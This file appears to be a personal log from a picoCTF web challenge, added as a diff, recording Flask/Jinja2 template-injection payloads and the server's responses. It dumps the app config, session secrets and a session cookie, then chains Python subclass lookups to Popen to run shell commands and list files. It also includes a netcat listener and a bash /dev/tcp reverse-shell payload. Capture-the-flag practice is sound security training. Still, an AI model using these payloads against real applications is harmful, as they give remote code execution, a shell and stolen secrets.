@@ -1,0 +1,129 @@
+
+{{2+2}}
+4
+
+{{self}}
+<TemplateReference None>
+
+{{config}}
+'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}'
+
+{{session}}
+
+ <SecureCookieSession {'_fresh': True, '_id':
+ '1e2808ddaff48fdc70008764d998834cb54db2945e05355adaaac11aa22cae3a166261c7a389c9e4d575c4a63bfc3dd5054dd674bc632429d2643a0e7f77da4d',
+ 'csrf_token': '524b88e53b9c620cd229e9e85376b57a079309a0', 'dark_secret':
+ 'picoCTF{its_a_me_your_flagf3d56a8a}', 'user_id': '73'}>
+
+
+{{request}}
+<Request 'http://2019shell1.picoctf.com:10833/list_items' [GET]>
+
+{{request.environ}}
+
+{'REQUEST_METHOD': 'GET', 'REQUEST_URI': '/list_items', 'PATH_INFO':
+'/list_items', 'QUERY_STRING': '', 'SERVER_PROTOCOL': 'HTTP/1.1', 'SCRIPT_NAME':
+'', 'SERVER_NAME': 'pico-2019-shell1', 'SERVER_PORT': '10833', 'REMOTE_ADDR':
+'0.0.0.0', 'HTTP_HOST': '2019shell1.picoctf.com:10833', 'HTTP_USER_AGENT':
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101
+Firefox/69.0', 'HTTP_ACCEPT':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+'HTTP_ACCEPT_LANGUAGE': 'uk,en-US;q=0.7,en;q=0.3', 'HTTP_ACCEPT_ENCODING':
+'gzip, deflate', 'HTTP_REFERER': 'http://2019shell1.picoctf.com:10833/login',
+'HTTP_DNT': '1', 'HTTP_CONNECTION': 'keep-alive', 'HTTP_COOKIE':
+'session=.eJwlz0tOwzAQgOG7eN2FMw8_ukXiBOyt8cwYogJFTrJAVe9OJA7wSf__CG1M3z7CdZ-HX0JbLVzD4lBiMZMxqAzTHGMsOZHVWgqSdibrUIk9MjKLiYguiwiAiqMsKUFaNAuWqtXJOLOSJOxD0Yzj6S1l6poQCKpBIpToeeRsQhYuQbc52n6_-ffZw0C9FGfsVRNENYDq1QtjTp2zxFwxVomnM5m3trlO30_4s-r95e31se5bk_bl7fd-zDY-5X2gcZIiz9Mcm8__8Yzh-QfdSFGF.XZj0-g.nFo1udVwXpCwBQcFiUm1klvYvBg',
+'HTTP_UPGRADE_INSECURE_REQUESTS': '1', 'HTTP_CACHE_CONTROL': 'max-age=0',
+'wsgi.input': <uwsgi._Input object at 0x7f615a9caf60>, 'wsgi.file_wrapper':
+<built-in function uwsgi_sendfile>, 'wsgi.version': (1, 0), 'wsgi.errors':
+<_io.TextIOWrapper name=2 mode='w' encoding='UTF-8'>, 'wsgi.run_once': False,
+'wsgi.multithread': False, 'wsgi.multiprocess': False, 'wsgi.url_scheme':
+'http', 'uwsgi.version': b'2.0.15-debian', 'uwsgi.node': b'pico-2019-shell1',
+'werkzeug.request': <Request 'http://2019shell1.picoctf.com:10833/list_items'
+[GET]>}
+
+
+{{[].__class__.__mro__[1].__subclasses__()}}
+
+{{[].__class__.__mro__[1].__subclasses__()[287]}}
+Popen
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("id", stdout=-1).communicate()}}
+
+b'uid=16840(empire2_5) gid=16841(empire2_5) groups=16841(empire2_5)'
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("pwd".split(), stdout=-1).communicate()}}
+
+b'/problems/empire2_5_1bad676783ccba04c844146d742084f6'
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("ls -la".split(), stdout=-1).communicate()}}
+total 88
+drwxr-x--- 3 hacksports empire2_5 4096 Oct 3 03:35 .
+drwxr-x--x 684 root root 69632 Oct 3 00:56 ..
+drwxr-xr-x 3 root root 4096 Oct 3 00:56 app
+-rw-rw-r-- 1 hacksports hacksports 61 Oct 3 00:56 server.py
+-rwxr-sr-x 1 hacksports empire2_5 105 Oct 3 03:35 xinet_startup.sh
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("ls -la app".split(), stdout=-1).communicate()}}
+total 36
+drwxr-xr-x 3 root root 4096 Oct 3 00:56 .
+drwxr-x--- 3 hacksports empire2_5 4096 Oct 3 03:35 ..
+-rw-rw-r-- 1 hacksports hacksports 1328 Oct 3 00:56 __init__.py
+-rw-rw-r-- 1 hacksports hacksports 348 Oct 3 00:56 config.py
+-rw-rw-r-- 1 hacksports hacksports 1382 Oct 3 00:56 helpers.py
+-rw-rw-r-- 1 hacksports hacksports 1113 Oct 3 00:56 models.py
+-rw-rw-r-- 1 hacksports hacksports 5997 Oct 3 00:56 routes.py
+drwxr-xr-x 2 root root 4096 Oct 3 00:56 templates
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("env".split(), stdout=-1).communicate()}}
+
+LANG=C.UTF-8
+INVOCATION_ID=d2eb0159f1e0437db4367aa45285b065
+PWD=/problems/empire2_5_1bad676783ccba04c844146d742084f6
+JOURNAL_STREAM=9:387123915
+REMOTE_HOST=<no address>
+SHLVL=1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+OLDPWD=/
+_=/usr/bin/uwsgi
+UWSGI_RELOADS=0
+UWSGI_ORIGINAL_PROC_NAME=uwsgi
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("hostname".split(), stdout=-1).communicate()}}
+
+'pico-2019-shell1'
+
+nc -lvp 38199
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("/bin/bash -i >& /dev/tcp/127.0.0.1/38199 0>&1", shell=1)}}
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("find /home -group empire2_5 2> /dev/null", shell=1, stdout=-1).communicate()}}
+.
+./server.py
+./app
+./app/templates
+./app/templates/employee.html
+./app/templates/404.html
+./app/templates/index.html
+./app/templates/base.html
+./app/templates/list.html
+./app/templates/register.html
+./app/templates/login.html
+./app/templates/create.html
+./app/helpers.py
+./app/__init__.py
+./app/config.py
+./app/models.py
+./app/routes.py
+./xinet_startup.sh
+
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("cat ./app/config.py", shell=1, stdout=-1, stderr=-1).communicate()}}
+cat: .: Is a directory
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("cd app; cat config.py", shell=1, stdout=-1, stderr=-1).communicate()}}
+class Config(object):
+ SECRET_KEY = 'picoCTF{your_flag_is_in_another_castle12345678}'
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("grep -r picoCTF", shell=1, stdout=-1, stderr=-1).communicate()}}
+
+{{[].__class__.__mro__[1].__subclasses__()[287]("cd app; cat models.py", shell=1, stdout=-1, stderr=-1).communicate()}}
